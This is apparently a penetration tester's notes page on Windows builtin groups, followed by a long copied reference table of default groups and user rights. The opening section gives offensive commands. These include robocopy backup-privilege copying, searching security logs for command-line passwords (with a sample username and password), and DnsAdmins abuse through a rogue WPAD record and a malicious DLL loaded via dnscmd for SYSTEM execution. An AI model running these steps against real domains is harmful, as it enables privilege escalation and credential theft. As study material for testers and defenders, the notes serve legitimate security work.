# Windows Groups

For [[Active-Directory-Privileged-Groups]] as well as the official documentation regarding Check [Active Directory default security groups by operating system version](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers).

## Builtin Groups


#### Backup Operators

[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) have the [[SeBackupPrivilege]] and SeRestorePrivilege privileges. Although the account must programmatically copy the data specifying the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag. 
```powershell
# /B flag is required
robocopy /B $SourcePath $DestinationPath
```

#### Event Log Readers

[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders) can read event logs from local computers. The group is created when the server is promoted to a domain controller - Check [Active Directory default security groups by operating system version](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers)
```powershell
# Searching security logs 
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Passing credentials with  wevtutil
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

[HTB academy](https://academy.hackthebox.com): *"Searching the `Security` event log with `Get-WinEvent` requires administrator access or permissions adjusted on the registry key `HKLM\System\CurrentControlSet\Services\Eventlog\Security`. Membership in just the `Event Log Readers` group is not sufficient."*
```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
# To run as a specific user:
# -Credential 
```

#### DNS Admins

[DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins) group have access to network DNS information and DNS service. The DNS service runs as `NT AUTHORITY\SYSTEM` supporting custom plugins specifiable with the builtit [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) utility. DnsAdmin do not have reboot permissions on DNS server by default. 

1. Use [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) authored by Benjamin Delphy by  modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute code - review [labofapenetrationtester article](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)


2. Create a WPAD Record - [[Responder-Cheatsheet]] or [[Inveigh-Cheatsheet]] to capture hashes as [DnsAdmins have permission to disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)
```powershell
# Disable the global query block list
Get-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.$domain.local
# Create a malicious A record point to our machine
Add-DnsServerResourceRecordA -Name wpad -ZoneName $domain.local -ComputerName dc01.$domain.local -IPv4Address $badIPv4address
```

3. User Dnscmd to load a plugin
[adsecurity DNSAdmin to Domain Admin article](https://adsecurity.org/?p=4064) attack chain:
- *DNS management is performed over RPC*
- *[ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. *This can be done with the `dnscmd` tool from the command line*
- *When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated*
- *When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)*
- *An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.*

[[Creating-Malicious-DLLs]], Review [Security Descriptor Definition Lanaguage](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language) - [How to view and modify permissions in Windows](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
```powershell
# Warning stop and starting a DNS server is destructive and bad opsec
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
# Get our SID
wmic useraccount where name="$compromisedUserThatRanDnscmd" get sid
# Check permissions on DNS service - beware SDDL - requires .exe 
sc.exe sdshow DNS
# Stop and start DNS to load the plugin
sc.exe stop dns
sc.exe start dns
sc.exe query dns
#
# Cleanup
#
# Confirm registry key added
reg query \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
# Delete registry key
reg delete \\$IPaddress\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

#### Hyper-V Administrators

[Hyper-V Administrators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#hyper-v-administrators) *have complete and unrestricted access to all the features in Hyper-V.*

#### Print Operators

[Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators) *can manage, create, share, and delete printers that are connected to domain controllers in the domain. They also can manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain.*

`SeLoadDriverPrivilege` either have elevated context bypass UAC ([[Bypassing-Windows-User-Account-Control]]) 

see [[SePrivilege-Token-Table]]

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege
https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/

#### Server Operators

[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

## ss64 Table

[ss64 Security Groups Table](https://ss64.com/nt/syntax-security_groups.html)

<table id="rowhover" style="max-width:1200px">
  <tr>
    <th>Default Group</th>
    <th><b>Default User </b>or Session owner</th>
<th>Special Identity</th>
    <th>Description</th>
  </tr>
  <tr>
<td>Access Control Assistance Operators</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Remotely query authorization attributes and permissions for resources on the computer.<br>
BuiltIn Local.<br>
Default User Rights:   <span class="code">None</span><br></td>
</tr>
<tr>
  <td>Account Operators</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td><p>Grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, local groups, and global groups, and members can log in locally to domain controllers. </p>
<p>Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: Allow log on locally: <span class="code">SeInteractiveLogonRight</span></p></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>Administrator</td>
<td>&nbsp;</td>
    <td>A user account for the system administrator. 
      This account is the first account created during operating system installation. 
      The account cannot be deleted or locked out. It is a member of the Administrators 
      group and cannot be removed from that group.<br>
<a href="[https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins](view-source:https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins)"></a></td>
  </tr>
  <tr>
    <td>Administrators</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td><p>A built-in group . Grants complete and unrestricted access to the computer, or if the computer is promoted to a domain controller, members have unrestricted access to the domain.</p>
<p>This group cannot be renamed, deleted, or moved. This built-in group controls access to all the domain controllers in its domain, and it can change the membership of all administrative groups. Membership can be modified by members of the following groups: the default service Administrators, Domain Admins in the domain, or Enterprise Admins.</p>
<p> The group is the default owner of any object that 
  is created by a member of the group.<br>
<a href="[https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins](view-source:https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-admins)">Default User Rights for Administrators</a></p></td>
  </tr>
  <tr>
<td>Allowed RODC Password Replication Group</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Manage a RODC password replication policy. The <em>Denied RODC Password Replication Group</em> group contains a variety of high-privilege accounts and security groups. The Denied RODC Password Replication group supersedes the Allowed RODC Password Replication group.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Anonymous Logon</td>
  <td>A user who has logged on anonymously. This identity allows anonymous access to resources, such as a web page that is published on corporate servers. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Authenticated Users </td>
    <td>A group that includes all users whose identities 
      were authenticated when they logged on. Membership is controlled by the 
      operating system. This identity allows access to shared resources within the domain, such as files in a shared folder that should be accessible to all the workers in the organization.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Access this computer from the network: <span class="code">SeNetworkLogonRight</span><br>
Add workstations to domain: <span class="code">SeMachineAccountPrivilege</span> (Often removed in environments that have an IT administrator.)<br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span></td>
  </tr>
  <tr>
    <td>Backup Operators</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A built-in group. By default, the group has 
      no members. Backup Operators can back up and restore all files on a computer, 
      regardless of the permissions that protect those files. Backup Operators 
      also can log on to the computer and shut it down.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <br>
Allow log on locally: <span class="code">SeInteractiveLogonRight</span><br>
Back up files and directories: <span class="code">SeBackupPrivilege</span><br>
Log on as a batch job: <span class="code">SeBatchLogonRight</span><br>
Restore files and directories: <span class="code">SeRestorePrivilege</span><br>
Shut down the system: <span class="code">SeShutdownPrivilege</span></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Batch</td>
    <td>Any user or process that accesses the system as a batch job (or through the batch queue) has the Batch identity. This identity allows batch jobs to run scheduled tasks, such as a nightly cleanup jobMembership is controlled by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
<td>Certificate Service DCOM Access</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group are allowed to connect to certification authorities in the enterprise.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>Cert Publishers</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>A global group that includes all computers 
      that are running an enterprise certificate authority. Cert Publishers are 
      authorized to publish certificates for User objects in Active Directory. 
<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
    <td>Cert Server Admins</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>Certificate Authority Administrators - authorized 
      to administer certificates for User objects in Active Directory. (Domain 
      Local)</td>
  </tr>
  <tr>
    <td>Cert Requesters</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>Members can request certificates (Domain Local)</td>
  </tr>
  <tr>
<td>Cloneable Domain Controllers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Cloneable Domain Controllers group that are domain controllers may be cloned. Default User Rights: <span class="code">None</span></td>
</tr>
<tr>
<td>Cryptographic Operators</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group are authorized to perform cryptographic operations. This security group was added in Windows Vista Service Pack 1 (SP1) to configure Windows Firewall for IPsec in Common Criteria mode. Default User Rights: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Creator Group </td>
  <td>The person who created the file or the directory is a member of this special identity group. Windows Server operating systems use this identity to automatically grant access permissions to the creator of a file or directory. A placeholder security identifier (SID) is created in an inheritable access control entry (ACE). When the ACE is inherited, the system replaces this SID with the SID for the primary group of the object’s current owner. <br>
The primary group is used only by the Portable Operating System Interface for UNIX (POSIX) subsystem.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Creator Owner</td>
    <td>The person who created the file or the directory is a member of this special identity group. Windows Server operating systems use this identity to automatically grant access permissions to the creator of a file or directory. A placeholder SID is created in an inheritable ACE. When the ACE is inherited, the system replaces this SID with the SID for the object’s current owner.</td>
  </tr>
  <tr>
<td>Denied RODC Password Replication Group</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Denied RODC Password Replication group cannot have their passwords replicated to any Read-only domain controller. The purpose of this security group is to manage a RODC password replication policy. This group contains a variety of high-privilege accounts and security groups. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Device Owners</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td><p>This group is not currently used in Windows.</p>
<p>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <br>
Allow log on locally: <span class="code">SeInteractiveLogonRight</span><br>
Access this computer from the network: <span class="code">SeNetworkLogonRight</span><br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span><br>
Change the time zone: <span class="code">SeTimeZonePrivilege</span></p></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Dialup </td>
  <td>Any user who accesses the system through a dial-up connection has the Dial-Up identity. This identity distinguishes dial-up users from other types of authenticated users.</td>
</tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Digest Authentication</td>
<td>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Distributed COM Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Distributed COM Users group are allowed to launch, activate, and use Distributed COM objects on the computer.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>DnsAdmins (installed with DNS)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group have administrative access to the DNS Server service. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group has no default members. <br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>DnsUpdateProxy (installed with DNS)</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group are DNS clients that can perform dynamic updates on behalf of other clients, such as DHCP servers. This group has no default members. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>Domain Admins</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>A global group whose members are authorized 
      to administer the domain. By default, the Domain Admins group is a member 
      of the Administrators group on all computers that have joined a domain, 
      including the domain controllers. Domain Admins is the default owner of 
      any object that is created in the domain's Active Directory by any member 
      of the group. If members of the group create other objects, such as files, 
    the default owner is the Administrators group.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: as Administrators</td>
</tr>
  <tr>
    <td>Domain Computers</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A global group that includes all computers 
      that have joined the domain, excluding domain controllers. Default User Rights: <span class="code">None</span></td>
  </tr>
  <tr>
    <td>Domain Controllers</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A global group that includes all domain controllers 
      in the domain. New domain controllers are added to this group automatically. 
  Default Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
    <td>Domain Guests</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A global group that, by default, has only one 
      member, the domain's built-in Guest account.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: See 'Guests'</td>
  </tr>
  <tr>
    <td>Domain Users</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A global group that, by default, includes all 
      user accounts in a domain. When you create a user account in a domain, it 
      is added to this group automatically.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: See 'Users'</td>
  </tr>
  <tr>
    <td>Enterprise Admins</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A group that exists only in the root domain 
      of an Active Directory forest of domains. It is a universal group if the 
      domain is in native mode, a global group if the domain is in mixed mode. 
      The group is authorized to make forest-wide changes in Active Directory, 
      such as adding child domains. By default, the only member of the group is 
      the Administrator account for the forest root domain.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
See Administrators <br>
See Denied RODC Password Replication Group</td>
  </tr>
  <tr>
<td>Enterprise Key Admins</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group can perform administrative actions on key objects within the forest. The Enterprise Key Admins group was introduced in Windows Server 2016. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Enterprise Read-Only Domain Controllers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group are Read-Only Domain Controllers in the enterprise. Except for account passwords, a Read-only domain controller holds all the Active Directory objects and attributes that a writable domain controller holds.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Enterprise Domain Controllers</td>
  <td>A group that includes all domain controllers 
      an Active Directory directory service forest of domains. Membership is controlled 
    by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Access this computer from the network: <span class="code">SeNetworkLogonRight</span><br>
Allow log on locally: <span class="code">SeInteractiveLogonRight</span></td>
</tr>
  <tr>
<td>Event Log Readers</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Everyone </td>
  <td>All interactive, network, dial-up, and authenticated users are members of the Everyone group. This special identity group gives wide access to system resources. Whenever a user logs on to the network, the user is automatically added to the Everyone group. On computers running Windows 2000 and earlier, the Everyone group included the Anonymous Logon group as a default member, but as of Windows Server 2003, the Everyone group contains only Authenticated Users and Guest; and it no longer includes Anonymous Logon by default (although this can be changed). Membership is controlled by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Access this computer from the network: <span class="code">SeNetworkLogonRight</span><br>
Act as part of the operating system: <span class="code">SeTcbPrivilege</span><br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span></td>
</tr>
  <tr>
    <td>Group Policy Creators Owners</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A global group that is authorized to create 
      new Group Policy objects in Active Directory. By default, the only member 
      of the group is Administrator. The default owner of a new Group Policy object 
      is usually the user who created it. If the user is a member of Administrators 
      or Domain Admins, all objects that are created by the user are owned by 
      the group. Owners have full control of the objects they own. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:   See 'Denied RODC Password Replication Group'.</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>Guest</td>
<td>&nbsp;</td>
    <td>A user account for people who do not have individual 
      accounts. This user account does not require a password. By default, the 
      Guest account is disabled.</td>
  </tr>
  <tr>
    <td>Guests</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A built-in group. By default, the only member 
      is the Guest account. The Guests group allows occasional or one-time users 
      to log on with limited privileges to a computer's built-in Guest account. 
  When a member of the Guests group signs out, the entire profile is deleted. This includes everything that is stored in the %userprofile% directory, including the user's registry hive information, custom desktop icons, and other user-specific settings. This implies that a guest must use a temporary profile to sign in to the system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
    <td>Hyper-V Administrators</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>Members of the Hyper-V Administrators group have complete and unrestricted access to all the features in Hyper-V. Adding members to this group helps reduce the number of members required in the Administrators group, and further separates access.<br>
Introduced in Windows Server 2012. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
<td>IIS_IUSRS</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>IIS_IUSRS is a built-in group that is used by Internet Information Services beginning with IIS 7.0. A built-in account and group are guaranteed by the operating system to always have a unique SID. IIS 7.0 replaces the IUSR_MachineName account and the IIS_WPG group with the IIS_IUSRS group to ensure that the actual names that are used by the new account and group will never be localized.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Incoming Forest Trust Builders</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Incoming Forest Trust Builders group can create incoming, one-way trusts to this forest. Active Directory provides security across multiple domains or forests through domain and forest trust relationships. This group cannot be renamed, deleted, or moved. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Key Admins</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group can perform administrative actions on key objects within the domain.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Interactive </td>
  <td>Any user who is logged on to the local system has the Interactive identity. This identity allows only local users to access a resource. Whenever a user accesses a given resource on the computer to which they are currently logged on, the user is automatically added to the Interactive group. Membership is controlled by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>KRBTGT</td>
<td>&nbsp;</td>
    <td>A service account that is used by the Key Distribution 
      Center (KDC) service.</td>
  </tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Local Service</td>
<td>The Local Service account is similar to an Authenticated User account. The Local Service account has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard your system if individual services or processes are compromised. Services that run as the Local Service account access network resources as a null session with anonymous credentials. The name of the account is NT AUTHORITY\LocalService. This account does not have a password.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Adjust memory quotas for a process: <span class="code">SeIncreaseQuotaPrivilege</span><br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span><br>
Change the system time: <span class="code">SeSystemtimePrivilege</span><br>
Change the time zone: <span class="code">SeTimeZonePrivilege</span><br>
Create global objects: <span class="code">SeCreateGlobalPrivilege</span><br>
Generate security audits: <span class="code">SeAuditPrivilege</span><br>
Impersonate a client after authentication: <span class="code">SeImpersonatePrivilege</span><br>
Replace a process level token: <span class="code">SeAssignPrimaryTokenPrivilege</span></td>
</tr>
<tr>
  <td>&nbsp;</td>
  <td>&nbsp;</td>
<td>Local System</td>
  <td>This is a service account that is used by the operating system. The LocalSystem account is a powerful account that has full access to the system and acts as the computer on the network. If a service logs on to the LocalSystem account on a domain controller, that service has access to the entire domain. Some services are configured by default to log on to the LocalSystem account. Do not change the default service setting. The name of the account is LocalSystem. This account does not have a password. <br>
Default User Rights: <span class="code">None</span></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Network </td>
    <td>This group implicitly includes all users who are logged on through a network connection. Any user who accesses the system through a network has the Network identity. This identity allows only remote users to access a resource. Whenever a user accesses a given resource over the network, the user is automatically added to the Network group. Membership is controlled by the operating system.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Network Service</td>
<td>The Network Service account is similar to an Authenticated User account. The Network Service account has the same level of access to resources and objects as members of the Users group. This limited access helps safeguard your system if individual services or processes are compromised. Services that run as the Network Service account access network resources by using the credentials of the computer account. The name of the account is NT AUTHORITY\NetworkService. This account does not have a password.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Adjust memory quotas for a process: <span class="code">SeIncreaseQuotaPrivilege</span><br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span><br>
Create global objects: <span class="code">SeCreateGlobalPrivilege</span><br>
Generate security audits: <span class="code">SeAuditPrivilege</span><br>
Impersonate a client after authentication: <span class="code">SeImpersonatePrivilege</span><br>
 Restore files and directories: <span class="code">SeRestorePrivilege</span><br>
Replace a process level token: <span class="code">SeAssignPrimaryTokenPrivilege</span></td>
</tr>
<tr>
  <td>Network Configuration Operators</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>Members of this group can make changes to TCP/IP settings, Rename/Enable/disable  LAN connections,Delete/rename remote access connections, enter the PIN unblock key (PUK) for mobile broadband devices that support a SIM card and renew and release TCP/IP addresses on domain controllers in the domain. This group has no default members.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>NTLM Authentication</td>
    <td>Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Other Organization</td>
<td>This group implicitly includes all users who are logged on to the system through a dial-up connection. Membership is controlled by the operating system. Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Performance Monitor Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group can monitor performance counters on domain controllers in the domain, locally and from remote clients without being a member of the Administrators or Performance Log Users groups.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
</tr>
<tr>
<td>Performance Log Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of this group can manage performance counters, logs and alerts on domain controllers in the domain, locally and from remote clients without being a member of the Administrators group.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:   Log on as a batch job: <span class="code">SeBatchLogonRight</span></td>
</tr>
<tr>
  <td>Power Users</td>
  <td>&nbsp;</td>
<td>&nbsp;</td>
  <td>By default, members of this group have no more user rights or permissions than a standard user account. <br>
The Power Users group did once grant users specific admin rights and permissions in previous versions of Windows.</td>
</tr>
  <tr>
    <td>Pre-Windows 2000 Compatible Access</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A backward compatibility group which allows 
      read access on all users and groups in the domain. By default, the special identity <span class="code">Everyone</span> is a member of this group. Add users to this group only if they are running Windows NT 4.0 or earlier.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Access this computer from the network: <span class="code">SeNetworkLogonRight</span><br>
Bypass traverse checking: <span class="code">SeChangeNotifyPrivilege</span></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
<td>Principal Self<br>
or <br>
Self</td>
    <td>This identify is a placeholder in an ACE on a user, group, or computer object in Active Directory. When you grant permissions to Principal Self, you grant them to the security principal that is represented by the object. During an access check, the operating system replaces the SID for Principal Self with the SID for the security principal that is represented by the object.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>: <span class="code">None</span></td>
  </tr>
  <tr>
    <td>Print Operators</td>
    <td>&nbsp;</td>
<td>&nbsp;</td>
    <td>A built-in group that exists only on domain 
      controllers. By default, the only member is the Domain Users group. Print 
      Operators can manage printers and document queues. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain.<br>
Because members of this group can load and unload device drivers on all domain controllers in the domain, add users with caution. This group cannot be renamed, deleted, or moved.<br>
Default <a href="[ntrights.html](view-source:https://ss64.com/nt/ntrights.html)">User Rights</a>:<br>
Allow log on locally: <span class="code">SeInteractiveLogonRight</span><br>
Load and unload device drivers: <span class="code">SeLoadDriverPrivilege</span><br>
Shut down the system: <span class="code">SeShutdownPrivilege</span></td>
  </tr>
  <tr>
<td>Protected Users</td>
<td>&nbsp;</td>
<td>&nbsp;</td>
<td>Members of the Protected Users group are afforded additional protection against the compromise of credentials during authentication processes. This security group is designed as part of a strategy to effectively protect and manage credentials within the enterprise. Members of this group automatically have non-configurable protection applied to their accounts. Membership in the Protected Users group is meant to be restrictive and proactively secure by default. The only method to modify the protection for an account is to remove the account from the security group. This group was introduced in Windows Server 2012 R2.<br>
